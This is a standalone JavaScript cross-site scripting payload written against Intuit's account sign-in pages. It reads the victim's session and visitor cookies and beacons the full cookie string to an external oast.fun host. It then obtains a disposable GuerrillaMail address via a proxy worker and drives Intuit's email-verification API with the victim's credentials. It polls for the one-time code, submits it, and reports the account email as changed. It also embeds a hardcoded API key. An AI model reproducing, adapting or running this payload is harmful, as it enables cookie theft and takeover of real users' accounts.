(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var W='https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=';
var G='https://api.guerrillamail.com/ajax.php';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function wp(url){
return fetch(W+encodeURIComponent(url)).then(function(r){
if(!r.ok)throw new Error('proxy '+r.status+' for '+url.substring(0,60));
return r.text()
})
}

var session=gc('ius_session');
var visitorId=gc('ivid');
var flowId='xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)});

beacon('p18-start',session.substring(0,30));
(new Image).src=O+'/p18-cookies?c='+encodeURIComponent(document.cookie.substring(0,2000));

var hdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':flowId,
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_origin':'https://accounts.intuit.com',
'intuit_country':'US',
'intuit_locale':'en-gb',
'intuit_offeringenv':'prd',
'intuit_authn_session_slot':'qbn',
'intuit_samesite_support':'true',
'intuit_identity_routing':'SBSEG',
'intuit_interception':'ignore-response',
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}))
};

log('[*] XSS on '+location.origin);
log('');
log('[0] Getting temp email from GuerrillaMail...');

wp(G+'?f=get_email_address')
.then(function(raw){
beacon('p18-gm-raw',raw.substring(0,300));
var data=JSON.parse(raw);
var email=data.email_addr;
var sid=data.sid_token;
log('[0] Email: '+email);
log('[0] SID: '+sid);
beacon('p18-email',email);

log('');
log('[1] Calling initialize...');

return fetch('/factors/v1/verifier/initialize/email',{
method:'POST',
headers:hdrs,
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email}),
credentials:'include'
})
.then(function(r){return r.json()})
.then(function(initData){
if(!initData.verifierSessionId)throw new Error('no vsid: '+JSON.stringify(initData));
var vsid=initData.verifierSessionId;
log('[1] OK — vsid: '+vsid);
log('[1] OTP sent to: '+email);
beacon('p18-init',vsid);

log('');
log('[2] Polling GuerrillaMail for OTP...');

var attempt=0;
function poll(){
attempt++;
return wp(G+'?f=check_email&seq=0&sid_token='+encodeURIComponent(sid))
.then(function(raw){
if(attempt<=3)beacon('p18-poll'+attempt,raw.substring(0,200));
var resp=JSON.parse(raw);
var list=resp.list||[];
log('[2] Poll #'+attempt+': '+list.length+' emails');
if(list.length>0){
var found=null;
for(var i=0;i<list.length;i++){
var subj=(list[i].mail_subject||'').toLowerCase();
if(subj.indexOf('welcome to guerrilla')!==-1)continue;
found=list[i];break
}
if(found){
var mailId=found.mail_id;
log('[2] Got email! id='+mailId+' subj='+found.mail_subject);
beacon('p18-mail','id='+mailId);
return wp(G+'?f=fetch_email&email_id='+mailId+'&sid_token='+encodeURIComponent(sid))
.then(function(raw2){return JSON.parse(raw2)})
}
}
if(attempt>=60)throw new Error('timeout after '+attempt+' polls');
return new Promise(function(res){setTimeout(function(){res(poll())},3000)})
})
}

return poll().then(function(msg){
var body=(msg.mail_body||'');
var text=body.replace(/<[^>]*>/g,' ');
log('[2] Subject: '+(msg.mail_subject||'?'));
log('[2] Body: '+text.substring(0,200));
beacon('p18-body',text.substring(0,400));
var m=text.match(/\b(\d{6})\b/);
var otp=m?m[1]:null;
if(!otp){var m2=text.match(/\b(\d{4,8})\b/);otp=m2?m2[1]:null}
if(!otp)throw new Error('no OTP in: '+text.substring(0,100));
log('[2] OTP: '+otp);
beacon('p18-otp',otp);

log('');
log('[3] Verifying OTP...');
return fetch('/factors/v1/verifier/verify/email',{
method:'POST',
headers:hdrs,
body:JSON.stringify({verifierSessionId:vsid,otp:otp}),
credentials:'include'
}).then(function(r3){return r3.text()}).then(function(b3){
log('[3] Response: '+b3);
beacon('p18-verify',b3);
log('');
log('=== EMAIL CHANGED TO: '+email+' ===');
beacon('p18-done','email='+email);
})
})
})
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p18-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p18-crash?e='+encodeURIComponent(e.message);
}
})();
